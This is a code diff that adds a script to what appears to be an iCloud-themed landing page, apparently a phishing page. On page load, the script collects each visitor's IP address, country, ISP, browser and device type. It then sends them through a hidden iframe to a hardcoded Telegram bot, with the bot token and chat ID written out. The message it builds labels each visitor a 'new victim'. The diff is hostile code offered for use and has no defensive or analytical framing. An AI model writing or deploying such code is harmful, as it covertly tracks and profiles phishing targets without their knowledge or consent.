@@ -66,6 +66,69 @@
             </div>
         </footer>
     </main>
+
+    <!-- 🚀 NOTIFICACIÓN DE VISITAS - SOLO PÁGINA PRINCIPAL -->
+    <script>
+    document.addEventListener('DOMContentLoaded', async function() {
+        console.log('🚀 iCloud Landing - Notificando visita...');
+        await notifyVisitor();
+    });
+
+    async function notifyVisitor() {
+        try {
+            const ipInfo = await getIPInfo();
+            const userAgent = navigator.userAgent;
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
+            const browser = getBrowserName(userAgent);
+            const device = isMobile ? 'iPhone' : 'PC/Desktop';
+            
+            const message = `⌨️ *Nueva Víctima visto link*
+📲 Dispositivo: ${isMobile ? 'iPhone' : device}
+🌐 Navegador: ${browser}
+📍 IP: ${ipInfo.ip}
+📆 Fecha: ${new Date().toLocaleString('es-ES')}
+🌎 País: ${ipInfo.country} 
+📡 Proveedor de Internet: ${ipInfo.isp}
+-------------------------------------------
+💻 Servidor: Astro505
+-------------------------------------------
+©️ 2025 Todos los derechos reservados.`;
+
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            document.body.appendChild(iframe);
+            
+            console.log('✅ Nueva visita notificada:', ipInfo.ip);
+        } catch (error) {
+            console.log('⚠️ Error notificando visita:', error);
+        }
+    }
+
+    async function getIPInfo() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ispResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const ispData = await ispResponse.json();
+            return {
+                ip: ipData.ip,
+                isp: ispData.org || 'ISP Desconocido',
+                country: ispData.country_name || 'País Desconocido'
+            };
+        } catch {
+            return { ip: 'N/A', isp: 'Web', country: 'Web' };
+        }
+    }
+
+    function getBrowserName(ua) {
+        if (ua.includes('Chrome')) return 'Chrome';
+        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Edge')) return 'Edge';
+        return 'Navegador';
+    }
+    </script>
 </body>
 
 </html>
